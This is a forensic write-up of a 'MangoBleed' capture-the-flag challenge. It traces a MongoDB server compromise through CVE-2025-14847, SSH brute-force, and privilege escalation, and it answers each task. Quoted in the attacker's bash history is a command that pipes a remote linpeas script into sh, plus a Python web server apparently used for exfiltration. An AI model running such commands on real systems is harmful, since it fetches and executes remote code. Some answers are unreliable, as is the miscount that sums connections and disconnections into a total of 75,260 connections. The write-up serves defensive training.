
## INFORMATION

    Type: DFIR
    Description (Scenario): You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

### Task 1: What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

From the initial Scenario Explanation we got the name of the vulnerability of "MongoBleed" so a quick google search: 
    - https://nvd.nist.gov/vuln/detail/cve-2025-14847
    - The CVE ID: ### CVE-2025-14847

### Task 2: What is the version of MongoDB installed on the server that the CVE exploited?

To confirm the version of MongoDB installed lets unzip the given file with the password "hacktheblue":
    - We then got "uac-mongodbsync-linux-triage" a linux_triage folder
    - Listing the files in the directory we get a more overall view of the folder:

	```
	 ┌──(kali㉿kali)-[~/HTB/Sherlocks/MangoBleed/uac-mongodbsync-linux-triage]
	└─$ ls -la
	total 28
	drwxrwxr-x.  7 kali kali 4096 Dec 29  2025  .
	drwxrwxr-x.  3 kali kali 4096 Oct 18 14:14  ..
	drwxrwxr-x.  2 kali kali 4096 Dec 29  2025  bodyfile
	drwxrwxr-x.  2 kali kali 4096 Dec 29  2025  hash_executables
	drwxrwxr-x.  9 kali kali 4096 Dec 29  2025  live_response
	drwxrwxr-x. 10 kali kali 4096 Dec 29  2025 '[root]'
	drwxrwxr-x.  2 kali kali 4096 Dec 29  2025  system
	  ```
      - As all the important logs and configs files are present in the root file so we'll start looking into it first:

	```
	┌──(kali㉿kali)-[~/…/Sherlocks/MangoBleed/uac-mongodbsync-linux-triage/[root]]
└─$ ls -la
total 40
drwxrwxr-x. 10 kali kali 4096 Dec 29  2025 .
drwxrwxr-x.  7 kali kali 4096 Dec 29  2025 ..
drwxrwxr-x. 95 kali kali 4096 Dec 29  2025 etc
drwxrwxr-x.  4 kali kali 4096 Dec 29  2025 home
drwxrwxr-x.  3 kali kali 4096 Dec 29  2025 lib
drwxrwxr-x.  3 kali kali 4096 Dec 29  2025 root
drwxrwxr-x.  3 kali kali 4096 Dec 29  2025 run
drwxrwxr-x.  3 kali kali 4096 Dec 29  2025 snap
drwxrwxr-x.  3 kali kali 4096 Dec 29  2025 usr
drwxrwxr-x.  7 kali kali 4096 Dec 29  2025 var
	```
    - Next by cd into var/mongodb/mongodb.log and grepping for the keyword "buildinfo" we get: 

	```
	{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}

	```
    --> Answer: 8.0.16

### Task 3: Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

--> First i tried grepping the IP but to evail then after reading the hints i see a mention of a detector script: https://github.com/Neo23x0/mongobleed-detector
    - After cloning the repo:

	```
	┌──(kali㉿kali)-[~/…/[root]/var/log/mongodb]
└─$ bash ~/HTB_TOOLS/mongobleed-detector/mongobleed-detector.sh --no-default-paths -t 10000000 -p mongod.log

Risk     SourceIP                                  ConnCount  MetaCount  DiscCount    MetaRate%    BurstRate/m FirstSeen (UTC)        LastSeen (UTC)        
-------- ---------------------------------------- ---------- ---------- ---------- ------------ -------------- ---------------------- ----------------------
HIGH     65.0.76.43                                    37630          0      37630        0.00%       30104.00 2025-12-29T05:25:52Z   2025-12-29T05:27:07Z  

═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════
Summary:
  HIGH:   1 source(s) - Likely exploitation detected

	```
    
### Task 4: Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)

    - Looking at the detection output above we can also see when the connection was first logged: 2025-12-29 05:25:52

### Task 5: Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

    - Looking at the Connection Count we can confirm that there has been 37630 connection made and 37630 disconnection 
    - --> In total there had been 75260 connection initiated by the attacker

### Task 6: The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

Reading the auth.log we can see that after a series of failed authentication attempt an interactive access was made:

```
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/var/log]
└─$ cat auth.log | grep -i "39825"
2025-12-29T05:39:21.879041+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.088863+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.276756+00:00 ip-172-31-38-170 sshd[39825]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2
2025-12-29T05:39:24.280444+00:00 ip-172-31-38-170 sshd[39825]: pam_unix(sshd:session): session opened for user mongoadmin(uid=1001) by mongoadmin(uid=0)
2025-12-29T05:39:24.861336+00:00 ip-172-31-38-170 sshd[39825]: pam_unix(sshd:session): session closed for user mongoadmin

```
--> However after we can see that this session was immediately closed after it started so we continue to filter the ip address:

```
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T05:48:28.249844+00:00 ip-172-31-38-170 sshd[40027]: Received disconnect from 65.0.76.43 port 46062:11: disconnected by user
2025-12-29T05:48:28.250045+00:00 ip-172-31-38-170 sshd[40027]: Disconnected from user mongoadmin 65.0.76.43 port 46062

```
--> The connection here lasted more than 8 minutes so we can conclude this is the timeframe when the attacker successfully gained interactive hands-on remote access. With the connected time of 025-12-29T05:40:03

### Task 7: Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

From Task 6 we can see that the attacker initiated a connection into user mongoadmin, so to see what command was used during the attack we should look at the bash history of the account during the timeframe:

```
┌──(kali㉿kali)-[~/…/Sherlocks/MangoBleed/uac-mongodbsync-linux-triage/[root]]
└─$ find . -name ".bash_history"

./home/mongoadmin/.bash_history
./home/ubuntu/.bash_history
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Sherlocks/MangoBleed/uac-mongodbsync-linux-triage/[root]]
└─$ cd home/mongoadmin/    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/home/mongoadmin]
└─$ ls -la
total 28
drwxrwxr-x. 2 kali kali 4096 Dec 29  2025 .
drwxrwxr-x. 4 kali kali 4096 Dec 29  2025 ..
-rw-rw-r--. 1 kali kali  250 Dec 29  2025 .bash_history
-rw-rw-r--. 1 kali kali  220 Dec 29  2025 .bash_logout
-rw-rw-r--. 1 kali kali 3771 Dec 29  2025 .bashrc
-rw-rw-r--. 1 kali kali  807 Dec 29  2025 .profile
-rw-rw-r--. 1 kali kali    7 Dec 29  2025 .python_history
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/home/mongoadmin]
└─$ cat .bash_history 
ls -la
whoami
curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```

--> We can see that the command was "curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.sh | sh"

### Task 8: The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

"/var/lib/mongodb/"
